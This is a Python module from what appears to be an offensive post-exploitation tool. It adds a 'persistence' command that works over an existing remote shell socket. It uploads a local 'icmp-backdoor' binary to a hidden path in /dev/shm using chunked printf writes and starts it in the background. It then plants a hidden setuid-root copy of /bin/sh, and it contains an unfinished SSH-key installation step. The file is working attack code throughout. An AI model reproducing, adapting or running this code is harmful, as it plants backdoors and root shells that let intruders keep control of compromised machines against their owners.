"""
Examples of stuff to maintain persistence on a machine
"""

import os
from .commands import *


def put_file(sock, source, destination, bytecount=20):
    """put_file - send a file to a socket with a shell on it using shell
                  commands. This does `printf` commands and redirection to
                  transfer a file to a host.
    """
    if not os.path.isfile(source):
        print("[-] file %s does not exist" % source)
        return False
    with open(source, "rb") as fp:
        cur_string = ""
        count = 1
        byte = fp.read(1)
        cur_string += "\\x" + hex(ord(byte))[2:]
        while byte != "":
            count += 1
            byte = fp.read(1)
            try:
                cur_string += "\\x" + hex(ord(byte))[2:]
            except TypeError:
                break
            if count % bytecount == 0:
                redirect = " >" if count <= bytecount else ">> "
                final = "printf \"" + cur_string + "\"" + redirect + destination + "\n"
                sock.send(final.encode())
                cur_string = ""
        if cur_string != "":
            redirect = " >" if count <= bytecount else ">> "
            final = "printf \"" + cur_string + "\"" + redirect + destination + "\n"
            sock.send(final.encode())

    return True


def cmd_persistence(sock, cmdline):
    uname = "uname -a" + "\n"
    sock.send(uname.encode())

    uname = sock.recv(8192)
    print(uname)
    if os.path.exists("/root/icmp-backdoor/icmp-backdoor"):
        print("[+] Sending icmp-backdoor")
        put_file(sock, "/root/icmp-backdoor/icmp-backdoor", "/dev/shm/.icmp-backdoor")
        sock.send("chmod 755 /dev/shm/.icmp-backdoor\n".encode())
        sock.send("/dev/shm/.icmp-backdoor &\n".encode())

    print("[+] Placing suid root shell in /dev/shm/.sh")
    sock.send("cp /bin/sh /dev/shm/.sh && chown root /dev/shm/.sh && chmod 4755 /dev/shm/.sh\n".encode())

    print("[+] Installing ssh key")
    sshkey = ""
    
    print("[+] doing id")
    sock.send("id\n".encode())
    received = ""
    while True:
        received = sock.recv(8192)
        if received.startswith(b"uid="):
            break
    print(received)

# Register this command
commands.append(("persistence", cmd_persistence))
commandhelp.append(("persistence", "installs a bunch of persistence stuff on a host."))

